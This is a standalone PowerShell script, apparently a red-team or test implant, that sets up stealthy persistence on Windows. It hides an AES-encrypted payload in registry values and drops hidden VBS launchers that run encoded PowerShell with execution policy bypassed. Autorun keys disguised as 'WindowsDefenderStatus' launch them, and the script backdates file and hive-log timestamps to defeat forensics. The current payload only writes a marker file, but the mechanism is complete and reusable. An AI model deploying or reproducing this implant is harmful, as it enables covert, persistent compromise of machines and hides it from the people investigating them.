# Verify elevated privileges
$pr = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
if (-not $pr.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { exit }

# Define plaintext payload
$p1 = "Set-Content -Path 'C:\Users\Public\Documents\pwned.txt' -Value 'Pwn3d' -Force"

# PRIMARY
$a1 = [System.Security.Cryptography.Aes]::Create()
$a1.KeySize = 256; $a1.BlockSize = 128
$a1.Mode = [System.Security.Cryptography.CipherMode]::CBC
$a1.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$a1.GenerateKey(); $a1.GenerateIV()
$e1 = $a1.CreateEncryptor()
$b1 = [System.Text.Encoding]::UTF8.GetBytes($p1)
$c1 = $e1.TransformFinalBlock($b1, 0, $b1.Length)
$e64 = [Convert]::ToBase64String($c1)
$k64 = [Convert]::ToBase64String($a1.Key)
$i64 = [Convert]::ToBase64String($a1.IV)
$rp1 = "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment"
New-ItemProperty -Path $rp1 -Name "DriverData" -Value "$e64|$k64|$i64" -PropertyType String -Force | Out-Null
$s1 = @'
$b=(Get-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name 'DriverData').DriverData
$x=$b -split '\|'
$a=[System.Security.Cryptography.Aes]::Create()
$a.KeySize=256;$a.BlockSize=128
$a.Mode=[System.Security.Cryptography.CipherMode]::CBC
$a.Padding=[System.Security.Cryptography.PaddingMode]::PKCS7
$a.Key=[Convert]::FromBase64String($x[1])
$a.IV=[Convert]::FromBase64String($x[2])
$d=$a.CreateDecryptor()
$n=[Convert]::FromBase64String($x[0])
$m=[System.Text.Encoding]::UTF8.GetString($d.TransformFinalBlock($n,0,$n.Length))
Invoke-Expression $m
'@
$l1 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($s1))
$vbs1 = "$env:SystemRoot\System32\drivers\etc\svcmon.vbs"
$vc1 = "Set sh = CreateObject(""WScript.Shell"")" + [Environment]::NewLine
$vc1 += "sh.Run ""powershell.exe -WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -EncodedCommand $l1"", 0, False"
Set-Content -Path $vbs1 -Value $vc1 -Encoding ASCII
(Get-Item -Path $vbs1 -Force).Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
$pk1 = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"
if (-not (Test-Path $pk1)) { New-Item -Path $pk1 -Force | Out-Null }
New-ItemProperty -Path $pk1 -Name "WindowsDefenderStatus" -Value "wscript.exe //B //Nologo `"$vbs1`"" -PropertyType String -Force | Out-Null

# BACKUP
$a2 = [System.Security.Cryptography.Aes]::Create()
$a2.KeySize = 256; $a2.BlockSize = 128
$a2.Mode = [System.Security.Cryptography.CipherMode]::CBC
$a2.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$a2.GenerateKey(); $a2.GenerateIV()
$e2 = $a2.CreateEncryptor()
$b2 = [System.Text.Encoding]::UTF8.GetBytes($p1)
$c2 = $e2.TransformFinalBlock($b2, 0, $b2.Length)
$e642 = [Convert]::ToBase64String($c2)
$k642 = [Convert]::ToBase64String($a2.Key)
$i642 = [Convert]::ToBase64String($a2.IV)
$rp2 = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom"
if (-not (Test-Path $rp2)) { New-Item -Path $rp2 -Force | Out-Null }
New-ItemProperty -Path $rp2 -Name "CompatData" -Value "$e642|$k642|$i642" -PropertyType String -Force | Out-Null
$s2 = @'
$b=(Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom' -Name 'CompatData').CompatData
$x=$b -split '\|'
$a=[System.Security.Cryptography.Aes]::Create()
$a.KeySize=256;$a.BlockSize=128
$a.Mode=[System.Security.Cryptography.CipherMode]::CBC
$a.Padding=[System.Security.Cryptography.PaddingMode]::PKCS7
$a.Key=[Convert]::FromBase64String($x[1])
$a.IV=[Convert]::FromBase64String($x[2])
$d=$a.CreateDecryptor()
$n=[Convert]::FromBase64String($x[0])
$m=[System.Text.Encoding]::UTF8.GetString($d.TransformFinalBlock($n,0,$n.Length))
Invoke-Expression $m
'@
$l2 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($s2))
$vbs2 = "$env:SystemRoot\System32\drivers\etc\netmon.vbs"
$vc2 = "Set sh = CreateObject(""WScript.Shell"")" + [Environment]::NewLine
$vc2 += "sh.Run ""powershell.exe -WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -EncodedCommand $l2"", 0, False"
Set-Content -Path $vbs2 -Value $vc2 -Encoding ASCII
(Get-Item -Path $vbs2 -Force).Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
$wk = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows"
if (-not (Test-Path $wk)) { New-Item -Path $wk -Force | Out-Null }
New-ItemProperty -Path $wk -Name "Load" -Value "wscript.exe //B //Nologo `"$vbs2`"" -PropertyType String -Force | Out-Null

# Also write to WOW6432Node for 32-bit coverage
$pk1wow = "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"
if (-not (Test-Path $pk1wow)) { New-Item -Path $pk1wow -Force | Out-Null }
New-ItemProperty -Path $pk1wow -Name "WindowsDefenderStatus" -Value "wscript.exe //B //Nologo `"$vbs1`"" -PropertyType String -Force | Out-Null

# TIMESTAMP BACKDATING (Layer 5b)
$dt = [DateTime]"2023-05-21 11:15:00"
foreach ($tp in @($vbs1, $vbs2)) {
    try { $fi = Get-Item -Path $tp -Force -ErrorAction Stop; $fi.CreationTime = $dt; $fi.LastWriteTime = $dt; $fi.LastAccessTime = $dt } catch {}
}
foreach ($lg in @("$env:SystemRoot\System32\config\SOFTWARE.LOG1","$env:SystemRoot\System32\config\SOFTWARE.LOG2")) {
    try { $lf = Get-Item -Path $lg -Force -ErrorAction Stop; $lf.LastWriteTime = $dt; $lf.LastAccessTime = $dt } catch {}
}
try { $d1 = Get-Item -Path "$env:SystemRoot\System32\config" -Force -ErrorAction Stop; $d1.LastAccessTime = $dt } catch {}
try { $d2 = Get-Item -Path "$env:SystemRoot\System32\drivers\etc" -Force -ErrorAction Stop; $d2.LastAccessTime = $dt } catch {}
